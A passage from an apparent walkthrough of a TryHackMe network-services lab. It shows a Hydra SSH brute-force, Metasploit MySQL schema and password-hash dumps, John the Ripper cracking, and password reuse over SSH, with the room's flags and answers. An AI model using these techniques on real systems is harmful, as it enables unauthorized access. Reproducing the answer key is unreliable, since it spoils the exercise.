Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-13 17:51:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.72.209:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://administrator@10.10.72.209:22
[INFO] Successful, password authentication is supported by ssh://10.10.72.209:22
[22][ssh] host: 10.10.72.209   login: administrator   password: alejandro
[STATUS] attack finished for 10.10.72.209 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-13 17:52:55
```

``

Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ ssh administrator@10.10.72.209
The authenticity of host '10.10.72.209 (10.10.72.209)' can't be established.
ECDSA key fingerprint is SHA256:ABheODwYmk63/Mmp8cbMSoVTNv3vcgWbzukZoGMb62I.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.72.209' (ECDSA) to the list of known hosts.
administrator@10.10.72.209's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Nov 13 16:54:01 UTC 2020

  System load:  0.02              Processes:           91
  Usage of /:   43.9% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.72.209
  Swap usage:   0%


87 packages can be updated.
35 updates are security updates.


Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
administrator@polosmtp:~$ ls -lA
total 44
-rw------- 1 administrator vagrant  852 Jul  1 12:08 .bash_history
-rw-r--r-- 1 administrator vagrant  220 Apr 22  2020 .bash_logout
-rw-r--r-- 1 administrator vagrant 3771 Apr 22  2020 .bashrc
drwx------ 2 administrator vagrant 4096 Apr 22  2020 .cache
-rw------- 1 administrator vagrant  136 Apr 22  2020 dead.letter
drwx------ 3 administrator vagrant 4096 Apr 22  2020 .gnupg
drwxrwxr-x 5 administrator vagrant 4096 Apr 22  2020 Maildir
-rw-r--r-- 1 administrator vagrant  807 Apr 22  2020 .profile
-rw------- 1 administrator vagrant 1024 Apr 22  2020 .rnd
-rw-r--r-- 1 root          root      39 Apr 22  2020 smtp.txt
drwx------ 2 administrator vagrant 4096 Apr 22  2020 .ssh
administrator@polosmtp:~$ cat smtp.txt
THM{who_knew_email_servers_were_c00l?}
```

`THM{who_knew_email_servers_were_c00l?}`

## Task 8 Understanding MySQL

**What is MySQL?**

In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Lets break it down:

**Database:**

A database is simply a persistent, organised collection of structured data

**RDBMS:**

A software or service used to create and manage databases based on a relational model. The word “relational” just means that the data stored in the dataset is organized as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

**SQL:**

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how does the client and server communicate? They use a language, specifically the Structured Query Language (SQL).

Many other products, such as PostgreSQL and Microsoft SQL server have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.

**How does MySQL work?**

MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of mySQL databases.

The server handles all database instructions like creating editing and accessing data. It takes, and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:

1. MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2. Clients make requests by making specific statements in SQL.
3. The server will respond to the client with whatever information has been requested

**What runs MySQL?**

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

**More Information:**

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

- https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html
- https://www.w3schools.com/php/php_mysql_intro.asp

What type of software is MySQL?

`relational database management system`

What language is MySQL based on?

`SQL`

What communication model does MySQL use?

`client-server`

What is a common application of MySQL?

`back end database`

What major social network uses MySQL as their back-end database? This will require further research.

`Facebook`

## Task 9 Enumerating MySQL

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**When you would begin attacking MySQL**

MySQL is likely not going to be the first point of call when it comes to getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information- however in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

**The Scenario**

Typically, you will have gained some initial credentials from enumerating other services, that you can then use to enumerate, and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the credentials: "**root:password**" while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

**Requirements**

You're going to want to have MySQL installed on your system, in order to connect to the remote MySQL server. In case this isn't already installed, you can install it using "sudo apt install MySQL". Don't worry- this won't install the server package on your system- just the client.

Again, we're going to be using Metasploit for this, it's important that you have it Metasploit installed, as it is by default on both Kali Linux and Parrot OS.

**Alternatives**

As with the previous task, it's worth noting that everything we're going to be doing using Metasploit can also be done either manually, or with a set of non-metasploit tools such as nmap's mysql-enum script: https://nmap.org/nsedoc/scripts/mysql-enum.html or https://www.exploit-db.com/exploits/23081. I recommend after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

Okay, enough talk. Let's get going!

As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ sudo nmap -A -sS -sC -sV -O 10.10.91.253
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 18:10 CET
Nmap scan report for 10.10.91.253
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, FoundRows, LongPassword, SupportsLoadDataLocal, SupportsCompression, SupportsTransactions, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x18\x0D\x15*bf\x08x~<Y\x12~=!\x01\x1Ew\x05\x03
|_  Auth Plugin Name: mysql_native_password
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/13%OT=22%CT=1%CU=41660%PV=Y%DS=2%DC=T%G=Y%TM=5FAEBE
OS:16%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   30.53 ms 10.8.0.1
2   30.80 ms 10.10.91.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```

`3306`

Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "`mysql -h [IP] -u [username] -p`"

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ mysql -h 10.10.91.253 -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

`No answer needed`

Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.

`No answer needed`

We're going to be using the "mysql_sql" module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order).

```
msf5 > search mysql_sql

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query


msf5 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as
msf5 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
PASSWORD => password
msf5 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.91.253
RHOSTS => 10.10.91.253
msf5 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
```

`PASSWORD/RHOSTS/USERNAME`

Run the exploit. By default it will test with the "select module()" command, what result does this give you?

```

msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.91.253

[*] 10.10.91.253:3306 - Sending statement: 'select version()'...
[*] 10.10.91.253:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```

`5.7.29-0ubuntu0.18.04.1`

Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?

```
msf5 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
SQL => show databases
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.91.253

[*] 10.10.91.253:3306 - Sending statement: 'show databases'...
[*] 10.10.91.253:3306 -  | information_schema |
[*] 10.10.91.253:3306 -  | mysql |
[*] 10.10.91.253:3306 -  | performance_schema |
[*] 10.10.91.253:3306 -  | sys |
[*] Auxiliary module execution completed
```

`4`

## Task 10 Exploiting MySQL

**What do we know?**

Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:

1. MySQL server credentials
2. The version of MySQL running
3. The number of Databases, and their names.

**Key Terminology**

In order to understand the exploits we're going to use next- we need to understand a few key terms.

**Schema:**

In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.

**Hashes:**

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.

In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently

However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

Lets get cracking.

First, let's search for and select the "mysql_schemadump" module. What's the module's full name?

```
msf5 > search mysql_schemadump

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_schemadump                   normal  No     MYSQL Schema Dump
```

`auxiliary/scanner/mysql/mysql_schemadump`

Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?

```
  - TableName: x$waits_global_by_latency
    Columns:
    - ColumnName: events
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned

[*] 10.10.91.253:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`x$waits_global_by_latency`

Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?

```
search mysql_hashdump

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/analyze/crack_databases                        normal  No     Password Cracker: Databases
   1  auxiliary/scanner/mysql/mysql_hashdump                   normal  No     MYSQL Password Hashdump


Interact with a module by name or index, for example use 1 or use auxiliary/scanner/mysql/mysql_hashdump
```

`auxiliary/scanner/mysql/mysql_hashdump`

Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

```
msf5 auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
PASSWORD => password
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.91.253
RHOSTS => 10.10.91.253
msf5 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 10.10.91.253:3306     - Saving HashString as Loot: root:
[+] 10.10.91.253:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.91.253:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.91.253:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.91.253:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.91.253:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.91.253:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`carl`

Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:\*HASH to a text file on your local machine called "hash.txt". What is the user/hash combination string?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ echo -n '*EA031893AA21444B170FC2162A56978B8CEECE18' > hash.txt
```

`carl:*EA031893AA21444B170FC2162A56978B8CEECE18`

Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Warning: Only 4 candidates left, minimum 8 needed for performance.
Proceeding with incremental:ASCII
doggie           (?)
1g 0:00:00:04 DONE 3/3 (2020-11-13 19:00) 0.2173g/s 804282p/s 804282c/s 804282C/s doggie..doggia
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`doggie`

Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What's the contents of MySQL.txt

```
kali@kali:~/CTFs/tryhackme/Network Services 2$ ssh carl@10.10.91.253
The authenticity of host '10.10.91.253 (10.10.91.253)' can't be established.
ECDSA key fingerprint is SHA256:9S3Avia08/py9bzFfGsbMQaGCJLMWT3uCYJxPZ/w2j4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.91.253' (ECDSA) to the list of known hosts.
carl@10.10.91.253's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Nov 13 18:01:53 UTC 2020

  System load:  0.0               Processes:           87
  Usage of /:   41.7% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.91.253
  Swap usage:   0%


23 packages can be updated.
0 updates are security updates.


Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
carl@polomysql:~$ ls -lA
total 36
-rw------- 1 carl carl  251 Apr 23  2020 .bash_history
-rw-r--r-- 1 carl carl  220 Apr 23  2020 .bash_logout
-rw-r--r-- 1 carl carl 3771 Apr 23  2020 .bashrc
drwx------ 2 carl carl 4096 Apr 23  2020 .cache
drwx------ 3 carl carl 4096 Apr 23  2020 .gnupg
-rw-r--r-- 1 carl carl  807 Apr 23  2020 .profile
drws--S--- 2 carl carl 4096 Apr 23  2020 .ssh
-rw------- 1 carl carl 1854 Apr 23  2020 .viminfo
-rw-rw-r-- 1 carl carl   44 Apr 23  2020 MySQL.txt
carl@polomysql:~$ cat MySQL.txt
THM{congratulations_you_got_the_mySQL_flag}
```

`THM{congratulations_you_got_the_mySQL_flag}`

## Task 11 Further Learning

**Reading**

Here's some things that might be useful to read after completing this room, if it interests you:

- https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

**Thank you**

Thanks for taking the time to work through this room, I wish you the best of luck in future.
~ Polo

Congratulations! You did it!

`No answer needed`
